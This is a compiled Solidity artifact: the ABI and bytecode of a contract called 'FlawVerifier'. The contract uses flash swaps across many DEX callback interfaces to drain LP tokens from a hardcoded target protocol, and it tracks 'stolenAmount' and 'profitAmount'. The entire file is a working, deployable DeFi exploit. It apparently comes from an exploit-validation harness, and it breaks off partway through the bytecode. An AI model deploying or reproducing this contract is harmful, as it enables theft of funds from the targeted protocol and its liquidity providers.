{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"attemptFlash","inputs":[{"name":"plan","type":"tuple","internalType":"struct FlawVerifier.Plan","components":[{"name":"pair","type":"address","internalType":"address"},{"name":"token0","type":"address","internalType":"address"},{"name":"token1","type":"address","internalType":"address"},{"name":"capitalAmount","type":"uint256","internalType":"uint256"},{"name":"burnLp","type":"uint256","internalType":"uint256"},{"name":"previewStealLp","type":"uint256","internalType":"uint256"},{"name":"previewRepayLp","type":"uint256","internalType":"uint256"},{"name":"previewProfitLp","type":"uint256","internalType":"uint256"}]}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"},{"type":"function","name":"biswapCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"croDefiSwapCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"executed","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"exploitPair","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"exploitToken0","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"exploitToken1","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"joeCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"liquidXCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"liquidXv2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"liquidxCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"liquidxV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"mDexCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"pancakeCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"seedCapitalUsed","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"smardexCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"stolenAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506144e18061001c5f395ff3fe608060405260043610610143575f3560e01c80635ff972cc116100b5578063c26558b01161006e578063c26558b0146103f4578063c41cfb4b1461041c578063cc1f2afa14610444578063da0d93891461046e578063edf857d1146104aa578063ee22dd87146104d45761014a565b80635ff972cc146103005780636488f3701461032a5780636c813d2914610352578063848008121461037a57806399967255146103a2578063a533d40e146103ca5761014a565b80633c2448ed116101075780633c2448ed1461021c57806345677bc714610232578063463defd11461025a5780634904b43f1461028457806349343624146102ac57806356d7b8cf146102d65761014a565b80630ec80b231461014e57806310d1e85c14610178578063139752c7146101a05780631d0032d3146101ca57806331a38c89146101f25761014a565b3661014a57005b5f5ffd5b348015610159575f5ffd5b506101626104fc565b60405161016f9190612ec3565b60405180910390f35b348015610183575f5ffd5b5061019e60048036038101906101999190612fab565b610520565b005b3480156101ab575f5ffd5b506101b4610534565b6040516101c19190612ec3565b60405180910390f35b3480156101d5575f5ffd5b506101f060048036038101906101eb9190612fab565b610559565b005b3480156101fd575f5ffd5b5061020661056d565b6040516102139190613049565b60405180910390f35b348015610227575f5ffd5b5061023061057f565b005b34801561023d575f5ffd5b5061025860048036038101906102539190612fab565b61071d565b005b348015610265575f5ffd5b5061026e610731565b60405161027b9190613049565b60405180910390f35b34801561028f575f5ffd5b506102aa60048036038101906102a59190612fab565b610744565b005b3480156102b7575f5ffd5b506102c0610758565b6040516102cd9190612ec3565b60405180910390f35b3480156102e1575f5ffd5b506102ea61077f565b6040516102f79190613071565b60405180910390f35b34801561030b575f5ffd5b50610314610785565b6040516103219190613071565b60405180910390f35b348015610335575f5ffd5b50610350600480360381019061034b9190612fab565b61078e565b005b34801561035d575f5ffd5b5061037860048036038101906103739190612fab565b6107a2565b005b348015610385575f5ffd5b506103a0600480360381019061039b9190612fab565b6107b6565b005b3480156103ad575f5ffd5b506103c860048036038101906103c39190612fab565b6107ca565b005b3480156103d5575f5ffd5b506103de6107de565b6040516103eb9190613071565b60405180910390f35b3480156103ff575f5ffd5b5061041a60048036038101906104159190612fab565b6107e4565b005b348015610427575f5ffd5b50610442600480360381019061043d9190612fab565b6107f8565b005b34801561044f575f5ffd5b5061045861080c565b6040516104659190612ec3565b60405180910390f35b348015610479575f5ffd5b50610494600480360381019061048f91906130ad565b610824565b6040516104a19190613049565b60405180910390f35b3480156104b5575f5ffd5b506104be610ad2565b6040516104cb9190612ec3565b60405180910390f35b3480156104df575f5ffd5b506104fa60048036038101906104f59190612fab565b610af7565b005b60028054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b61052d8585858585610b0b565b5050505050565b60045f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6105668585858585610b0b565b5050505050565b60025f9054906101000a900460ff1681565b60025f9054906101000a900460ff1661071b57600160025f6101000a81548160ff0219169083151502179055505f73364f17a23ae4350319b7491224d10df5796190bc90505f8173ffffffffffffffffffffffffffffffffffffffff1663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa15801561060e573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061063291906130ed565b90505f61063e826111cf565b90505f810361064f5750505061071b565b5f5f90505b81811015610716575f61066784836112d5565b90505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036106a2575061070b565b5f6106ac826113e7565b90505f8160a0015114806106c357505f8160600151145b806106d157505f8160800151145b156106dd57505061070b565b5f8160c00151036106ef57505061070b565b6106f881611728565b156107085750505050505061071b565b50505b806001019050610654565b505050505b565b61072a8585858585610b0b565b5050505050565b600260019054906101000a900460ff1681565b6107518585858585610b0b565b5050505050565b5f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60055481565b5f600154905090565b61079b8585858585610b0b565b5050505050565b6107af8585858585610b0b565b5050505050565b6107c38585858585610b0b565b5050505050565b6107d78585858585610b0b565b5050505050565b60065481565b6107f18585858585610b0b565b5050505050565b6108058585858585610b0b565b5050505050565b73364f17a23ae4350319b7491224d10df5796190bc81565b5f3073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610893576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161088a90613172565b60405180910390fd5b6040518060a00160405280835f0160208101906108b09190613190565b73ffffffffffffffffffffffffffffffffffffffff1681526020018360200160208101906108de9190613190565b73ffffffffffffffffffffffffffffffffffffffff16815260200183604001602081019061090c9190613190565b73ffffffffffffffffffffffffffffffffffffffff16815260200183606001358152602001836080013581525060075f820151815f015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506020820151816001015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506040820151816002015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506060820151816003015560808201518160040155905050815f016020810190610a349190613190565b73ffffffffffffffffffffffffffffffffffffffff1663022c0d9f83606001355f308660800135604051602001610a6b9190613071565b6040516020818303038152906040526040518563ffffffff1660e01b8152600401610a99949392919061326d565b5f604051808303815f87803b158015610ab0575f5ffd5b505af1158015610ac2573d5f5f3e3d5ffd5b505050505f600154119050919050565b60035f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b610b048585858585610b0b565b5050505050565b60075f015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610b9c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b9390613301565b60405180910390fd5b3073ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff1614610c0a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c0190613369565b60405180910390fd5b60076003015484148015610c1d57505f83145b610c5c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c53906133d1565b60405180910390fd5b6007600401548282810190610c7191906133ef565b14610cb1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ca890613464565b60405180910390fd5b5f60075f015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610d0e9190612ec3565b602060405180830381865afa158015610d29573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610d4d9190613496565b90505f610d5e600760030154611964565b9050600760040154811015610da8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d9f9061350b565b60405180910390fd5b610db6600760040154611ae1565b5f8260075f015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610e149190612ec3565b602060405180830381865afa158015610e2f573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610e539190613496565b610e5d9190613556565b90505f8111610ea1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e98906135d3565b60405180910390fd5b5f60016103e56103e88a610eb591906135f1565b610ebf919061365f565b610ec9919061368f565b9050610ed58282611c5a565b610f2760076001015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660075f015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836122ed565b60075f015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff165f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610fe29190612ec3565b602060405180830381865afa158015610ffd573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906110219190613496565b6001819055505f6001541161106b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016110629061370c565b60405180910390fd5b6001600260016101000a81548160ff02191690831515021790555060075f015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff166002806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060076001015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660035f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060076002015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660045f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060076003015460058190555081600681905550505050505050505050565b5f5f5f8373ffffffffffffffffffffffffffffffffffffffff1663574f2ba360e01b604051602401604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516112619190613764565b5f60405180830381855afa9150503d805f8114611299576040519150601f19603f3d011682016040523d82523d5f602084013e61129e565b606091505b50915091508180156112b257506020815110155b156112ce57808060200190518101906112cb9190613496565b92505b5050919050565b5f5f5f8473ffffffffffffffffffffffffffffffffffffffff16631e3dd18b60e01b856040516024016113089190613071565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516113729190613764565b5f60405180830381855afa9150503d805f81146113aa576040519150601f19603f3d011682016040523d82523d5f602084013e6113af565b606091505b50915091508180156113c357506020815110155b156113df57808060200190518101906113dc91906137b5565b92505b505092915050565b6113ef612d45565b81815f019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff16815250508173ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa15801561146f573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061149391906130ed565b816020019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff16815250508173ffffffffffffffffffffffffffffffffffffffff1663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015611513573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061153791906130ed565b816040019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff16815250505f5f8373ffffffffffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa1580156115b9573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906115dd919061385c565b5091509150816dffffffffffffffffffffffffffff16836060018181525050806dffffffffffffffffffffffffffff168360800181815250508373ffffffffffffffffffffffffffffffffffffffff166318160ddd6040518163ffffffff1660e01b8152600401602060405180830381865afa15801561165f573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906116839190613496565b8360a00181815250508373ffffffffffffffffffffffffffffffffffffffff166370a0823173364f17a23ae4350319b7491224d10df5796190bc6040518263ffffffff1660e01b81526004016116d99190612ec3565b602060405180830381865afa1580156116f4573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906117189190613496565b8360c00181815250505050919050565b5f5f6117468360c00151846060015185608001518660a00151612373565b90505f8103611758575f91505061195f565b611760612dbd565b81815f60078110611774576117736138ac565b5b60200201818152505060028261178a919061365f565b8160016007811061179e5761179d6138ac565b5b6020020181815250506004826117b4919061365f565b816002600781106117c8576117c76138ac565b5b6020020181815250506008826117de919061365f565b816003600781106117f2576117f16138ac565b5b602002018181525050601082611808919061365f565b8160046007811061181c5761181b6138ac565b5b602002018181525050602082611832919061365f565b81600560078110611846576118456138ac565b5b60200201818152505060408261185c919061365f565b816006600781106118705761186f6138ac565b5b6020020181815250505f5f90505b6007811015611958575f6118a98684846007811061189f5761189e6138ac565b5b60200201516123fd565b90505f8160e00151036118bc575061194d565b3073ffffffffffffffffffffffffffffffffffffffff1663da0d9389826040518263ffffffff1660e01b81526004016118f59190613997565b6020604051808303815f875af192505050801561193057506040513d601f19601f8201168201806040525081019061192d91906139db565b60015b1561194b5780156119495760019550505050505061195f565b505b505b80600101905061187e565b505f925050505b919050565b5f6119a860076001015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673364f17a23ae4350319b7491224d10df5796190bc8461257e565b5f60405180606001604052808481526020015f81526020015f81525090505f6119cf612739565b905073364f17a23ae4350319b7491224d10df5796190bc73ffffffffffffffffffffffffffffffffffffffff166347a124853060076001015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff165f8560076001015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660076002015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16895f6040518963ffffffff1660e01b8152600401611a98989796959493929190613e1a565b6020604051808303815f875af1158015611ab4573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611ad89190613496565b92505050919050565b611b2360075f015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673364f17a23ae4350319b7491224d10df5796190bc8361257e565b5f60405180606001604052805f81526020015f81526020015f81525090505f611b4a612739565b905073364f17a23ae4350319b7491224d10df5796190bc73ffffffffffffffffffffffffffffffffffffffff1663a49cb2a63060076001015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660076002015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff168760075f015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff165f5f898b6040518a63ffffffff1660e01b8152600401611c1499989796959493929190613e9e565b6020604051808303815f875af1158015611c30573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611c549190613496565b50505050565b5f73364f17a23ae4350319b7491224d10df5796190bc73ffffffffffffffffffffffffffffffffffffffff1663f887ea406040518163ffffffff1660e01b8152600401602060405180830381865afa158015611cb8573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611cdc91906130ed565b90505f5f60075f015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015611d4c573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611d70919061385c565b50915091505f60075f015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166318160ddd6040518163ffffffff1660e01b8152600401602060405180830381865afa158015611de2573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611e069190613496565b90505f611e3686856dffffffffffffffffffffffffffff16856dffffffffffffffffffffffffffff16858b61279f565b9050868110611e7a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611e7190613f7a565b60405180910390fd5b611ea860075f015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16868361257e565b8473ffffffffffffffffffffffffffffffffffffffff1663baa2abde60076001015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660076002015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16845f5f30426040518863ffffffff1660e01b8152600401611f359796959493929190613f98565b60408051808303815f875af1158015611f50573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611f749190614005565b50505f60076002015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401611fd49190612ec3565b602060405180830381865afa158015611fef573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906120139190613496565b90505f8111156122055761204c60076002015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16878361257e565b5f600267ffffffffffffffff81111561206857612067614043565b5b6040519080825280602002602001820160405280156120965781602001602082028036833780820191505090505b50905060076002015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815f815181106120d1576120d06138ac565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff168152505060076001015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681600181518110612144576121436138ac565b5b602002602001019073ffffffffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffffffffffffffffffffff16815250508673ffffffffffffffffffffffffffffffffffffffff166338ed1739835f8430426040518663ffffffff1660e01b81526004016121bf959493929190614118565b5f604051808303815f875af11580156121da573d5f5f3e3d5ffd5b505050506040513d5f823e3d601f19601f82011682018060405250810190612202919061427b565b50505b8660076001015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016122639190612ec3565b602060405180830381865afa15801561227e573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906122a29190613496565b10156122e3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016122da9061430c565b60405180910390fd5b5050505050505050565b61236e8363a9059cbb60e01b848460405160240161230c92919061432a565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505061281e565b505050565b5f60018211612384575f90506123f5565b5f5f90505f6001846123969190613556565b90505b808210156123ef575f60018083856123b1919061368f565b6123bb919061368f565b901c9050876123cc8289898961292b565b116123d9578092506123e9565b6001816123e69190613556565b91505b50612399565b81925050505b949350505050565b612405612ddf565b5f820315612578575f61242683856060015186608001518760a0015161292b565b90505f81148061243957508360c0015181115b156124445750612578565b5f61245d84866060015187608001518860a001516129fd565b90505f811480612471575084606001518110155b1561247d575050612578565b5f60016103e56103e88461249191906135f1565b61249b919061365f565b6124a5919061368f565b90505f6124c182886060015189608001518a60a001518861279f565b90505f8114806124d15750838110155b156124df5750505050612578565b604051806101000160405280885f015173ffffffffffffffffffffffffffffffffffffffff168152602001886020015173ffffffffffffffffffffffffffffffffffffffff168152602001886040015173ffffffffffffffffffffffffffffffffffffffff168152602001848152602001878152602001858152602001828152602001828661256e9190613556565b8152509450505050505b92915050565b5f8373ffffffffffffffffffffffffffffffffffffffff1663dd62ed3e30856040518363ffffffff1660e01b81526004016125ba929190614351565b602060405180830381865afa1580156125d5573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906125f99190613496565b90508181106126085750612734565b5f8114612691576126908463095ea7b360e01b855f60405160240161262e9291906143b4565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505061281e565b5b6127328463095ea7b360e01b857fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040516024016126d092919061432a565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505061281e565b505b505050565b612741612e5e565b5f67ffffffffffffffff81111561275b5761275a614043565b5b60405190808252806020026020018201604052801561279457816020015b612781612e71565b8152602001906001900390816127795790505b50815f018190525090565b5f5f8614806127ad57505f82145b156127ba575f9050612815565b5f600190505f8390505b8082101561280f575f600182846127db919061368f565b901c9050886127ec828a8a8a61292b565b106127f957809150612809565b600181612806919061368f565b92505b506127c4565b81925050505b95945050505050565b5f5f8373ffffffffffffffffffffffffffffffffffffffff16836040516128459190613764565b5f604051808303815f865af19150503d805f811461287e576040519150601f19603f3d011682016040523d82523d5f602084013e612883565b606091505b5091509150816128c8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016128bf90614425565b60405180910390fd5b5f8151111561292557808060200190518101906128e591906139db565b612924576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161291b9061448d565b60405180910390fd5b5b50505050565b5f5f85148061293957505f82145b15612946575f90506129f5565b5f82868661295491906135f1565b61295e919061365f565b90505f83878661296e91906135f1565b612978919061365f565b90505f8214801561298857505f81145b15612997575f925050506129f5565b85821015806129a65750848110155b156129b5575f925050506129f5565b5f82876129c29190613556565b90505f82876129d19190613556565b90505f6129df848385612aa6565b905080856129ed919061368f565b955050505050505b949350505050565b5f5f851480612a0d575060018411155b15612a1a575f9050612a9e565b5f600190505f600186612a2d9190613556565b905086612a3c82888888612b16565b1015612a4c575f92505050612a9e565b5b80821015612a98575f60018284612a64919061368f565b901c905087612a7582898989612b16565b10612a8257809150612a92565b600181612a8f919061368f565b92505b50612a4d565b81925050505b949350505050565b5f5f841480612ab457505f83145b80612abe57505f82145b15612acb575f9050612b0f565b5f6103e585612ada91906135f1565b9050806103e885612aeb91906135f1565b612af5919061368f565b8382612b0191906135f1565b612b0b919061365f565b9150505b9392505050565b5f5f851480612b2457505f84145b80612b2e57505f83145b80612b3857505f82145b15612b45575f9050612c32565b5f612b508587612c3a565b90505f811480612b605750858110155b15612b6e575f915050612c32565b5f612b7a828787612aa6565b90505f811480612b8a5750848110155b15612b99575f92505050612c32565b5f8288612ba69190613556565b90505f8388612bb5919061368f565b90505f8388612bc49190613556565b90505f821480612bd357505f81145b15612be5575f95505050505050612c32565b5f828885612bf391906135f1565b612bfd919061365f565b90505f828987612c0d91906135f1565b612c17919061365f565b9050808210612c265780612c28565b815b9750505050505050505b949350505050565b5f5f831480612c4857505f82145b15612c55575f9050612ce3565b5f6107cd808586612c6691906135f1565b612c7091906135f1565b612c7a91906135f1565b90505f6103e88486610f94612c8f91906135f1565b612c9991906135f1565b612ca391906135f1565b90506107ca6107cd86612cb691906135f1565b612cca8385612cc5919061368f565b612ce9565b612cd49190613556565b612cde919061365f565b925050505b92915050565b5f5f6002600184612cfa919061368f565b612d04919061365f565b90508291505b81811015612d3f578091506002818285612d24919061365f565b612d2e919061368f565b612d38919061365f565b9050612d0a565b50919050565b6040518060e001604052805f73ffffffffffffffffffffffffffffffffffffffff1681526020015f73ffffffffffffffffffffffffffffffffffffffff1681526020015f73ffffffffffffffffffffffffffffffffffffffff1681526020015f81526020015f81526020015f81526020015f81525090565b6040518060e00160405280600790602082028036833780820191505090505090565b6040518061010001604052805f73ffffffffffffffffffffffffffffffffffffffff1681526020015f73ffffffffffffffffffffffffffffffffffffffff1681526020015f73ffffffffffffffffffffffffffffffffffffffff1681526020015f81526020015f81526020015f81526020015f81526020015f81525090565b6040518060200160405280606081525090565b6040518060200160405280606081525090565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f612ead82612e84565b9050919050565b612ebd81612ea3565b82525050565b5f602082019050612ed65f830184612eb4565b92915050565b5f604051905090565b5f5ffd5b5f5ffd5b612ef681612ea3565b8114612f00575f5ffd5b50565b5f81359050612f1181612eed565b92915050565b5f819050919050565b612f2981612f17565b8114612f33575f5ffd5b50565b5f81359050612f4481612f20565b92915050565b5f5ffd5b5f5ffd5b5f5ffd5b5f5f83601f840112612f6b57612f6a612f4a565b5b8235905067ffffffffffffffff811115612f8857612f87612f4e565b5b602083019150836001820283011115612fa457612fa3612f52565b5b9250929050565b5f5f5f5f5f60808688031215612fc457612fc3612ee5565b5b5f612fd188828901612f03565b9550506020612fe288828901612f36565b9450506040612ff388828901612f36565b935050606086013567ffffffffffffffff81111561301457613013612ee9565b5b61302088828901612f56565b92509250509295509295909350565b5f8115159050919050565b6130438161302f565b82525050565b5f60208201905061305c5f83018461303a565b92915050565b61306b81612f17565b82525050565b5f6020820190506130845f830184613062565b92915050565b5f5ffd5b5f61010082840312156130a4576130a361308a565b5b81905092915050565b5f61010082840312156130c3576130c2612ee5565b5b5f6130d08482850161308e565b91505092915050565b5f815190506130e781612eed565b92915050565b5f6020828403121561310257613101612ee5565b5b5f61310f848285016130d9565b91505092915050565b5f82825260208201905092915050565b7f73656c66206f6e6c7900000000000000000000000000000000000000000000005f82015250565b5f61315c600983613118565b915061316782613128565b602082019050919050565b5f6020820190508181035f83015261318981613150565b9050919050565b5f602082840312156131a5576131a4612ee5565b5b5f6131b284828501612f03565b91505092915050565b5f819050919050565b5f819050919050565b5f6131e76131e26131dd846131bb565b6131c4565b612f17565b9050919050565b6131f7816131cd565b82525050565b5f81519050919050565b5f82825260208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f61323f826131fd565b6132498185613207565b9350613259818560208601613217565b61326281613225565b840191505092915050565b5f6080820190506132805f830187613062565b61328d60208301866131ee565b61329a6040830185612eb4565b81810360608301526132ac8184613235565b905095945050505050565b7f756e6578706563746564207061697200000000000000000000000000000000005f82015250565b5f6132eb600f83613118565b91506132f6826132b7565b602082019050919050565b5f6020820190508181035f830152613318816132df565b9050919050565b7f756e65787065637465642073656e6465720000000000000000000000000000005f82015250565b5f613353601183613118565b915061335e8261331f565b602082019050919050565b5f6020820190508181035f83015261338081613347565b9050919050565b7f756e657870656374656420616d6f756e747300000000000000000000000000005f82015250565b5f6133bb601283613118565b91506133c682613387565b602082019050919050565b5f6020820190508181035f8301526133e8816133